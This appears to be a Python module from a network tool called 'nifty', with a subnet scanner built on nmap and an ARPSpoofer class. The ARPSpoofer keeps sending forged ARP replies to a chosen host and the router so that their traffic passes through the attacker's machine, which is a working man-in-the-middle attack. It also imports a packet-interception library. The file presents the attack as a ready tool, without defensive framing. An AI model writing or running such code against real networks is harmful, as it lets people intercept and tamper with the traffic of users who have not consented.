from scapy.all import *
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp
from nifty.network.utils import check_root, get_if_cidr
from nifty.network.utils import get_mac, get_router_ip
from netfilterqueue import NetfilterQueue
import nifty.config as config
from threading import Thread
from time import sleep
import nmap
import os

class NetworkDevice():
    def __init__(self, ip: str, mac: str | None):
        self.ip: str = ip
        self.mac: str | None = mac

    def __str__(self) -> str:
        return "{"+f"ip: {self.ip}, mac: {self.mac}"+"}"

    def __repr__(self):
        return self.__str__()

class ARPSpoofer():
    def __init__(self, target_ip: str | NetworkDevice, interface:str=None, router_ip=get_router_ip()):
        if not interface:interface=config.interface
        if isinstance(target_ip, NetworkDevice):
            self.target_ip = target_ip.ip
            self.target_mac = target_ip.mac
        else:
            self.target_ip = target_ip
            self.target_mac = get_mac(self.target_ip, interface)
        self.router_ip = router_ip
        self.router_mac = get_mac(self.router_ip, interface)
        self.running = False
        if not self.target_mac:
            raise Exception("Couldn't find target MAC")
        if not self.router_mac:
            raise Exception("Couldn't find router MAC")
        self.poison_thread = None

    def arp_poison(self):
        while self.running:
            send(ARP(op=2, pdst=self.target_ip,
                     psrc=self.router_ip, hwdst=self.target_mac), verbose=False)
            send(ARP(op=2, pdst=self.router_ip,
                     psrc=self.target_ip, hwdst=self.router_mac), verbose=False)
            sleep(3)

    def start(self, verbose=True):
        if verbose:
            print("Starting ARP spoofing...")
        self.poison_thread = Thread(target=self.arp_poison)
        self.running = True
        self.poison_thread.start()

    def stop(self, verbose=True):
        if verbose:
            print("Stopping ARP spoofing...")
        if self.poison_thread:
            self.running = False
            self.poison_thread.join(timeout=4)
            if verbose:
                print("ARP spoofing stopped.")

        if verbose:
            print("Restoring targets")
        send(ARP(op=2, pdst=self.router_ip, psrc=self.target_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac), count=7)
        send(ARP(op=2, pdst=self.target_ip, psrc=self.router_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.router_mac), count=7)


def arp_scan(iface:str=None, cidr_range="auto") -> list[NetworkDevice]:
    if not iface:iface=config.interface
    check_root()


    if cidr_range == "auto":
        cidr_range = get_if_cidr(iface)

    nm = nmap.PortScanner()

    #scan the network
    nm.scan(hosts=cidr_range, arguments='-sn', sudo=True)

    # create a list of devices on the network
    devices = []

    # iterate through the hosts and add their IP and MAC addresses to the list
    for host in nm.all_hosts():
        devices.append(NetworkDevice(host, 'mac' in nm[host]['addresses'] and nm[host]['addresses']['mac'] or None))

    return devices